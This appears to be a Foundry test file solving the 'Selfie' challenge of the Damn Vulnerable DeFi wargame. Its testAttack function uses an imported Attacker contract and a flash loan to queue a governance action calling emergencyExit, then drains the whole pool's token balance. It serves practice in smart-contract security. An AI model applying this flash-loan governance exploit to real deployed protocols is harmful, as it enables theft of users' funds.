// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/SimpleGovernance.sol";
import "../src/SelfiePool.sol";
import "../src/DamnValuableTokenSnapshot.sol";
import "../src/Attacker.sol";

contract SelfieTest is Test {
    uint256 constant TOKEN_INITIAL_SUPPLY = 2000000 * 10 ** 18;
    uint256 constant TOKENS_IN_POOL = 1500000 * 10 ** 18;

    DamnValuableTokenSnapshot token;
    SimpleGovernance governance;
    SelfiePool pool;
    Attacker player;

    function setUp() public {
        vm.warp(1);

        token = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        governance = new SimpleGovernance(address(token));

        assertEq(governance.getActionCounter(), 1);

        pool = new SelfiePool(address(token), address(governance));
        token.transfer(address(pool), TOKENS_IN_POOL);
        token.snapshot();

        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    function testAttack() public {
        player = new Attacker(pool, governance);

        bytes memory data = abi.encodeWithSelector(
            pool.emergencyExit.selector,
            player
        );

        player.attack(data);

        vm.warp(1 + 2 days);

        vm.prank(address(player));
        governance.executeAction(1);

        assertEq(token.balanceOf(address(player)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
    }
}
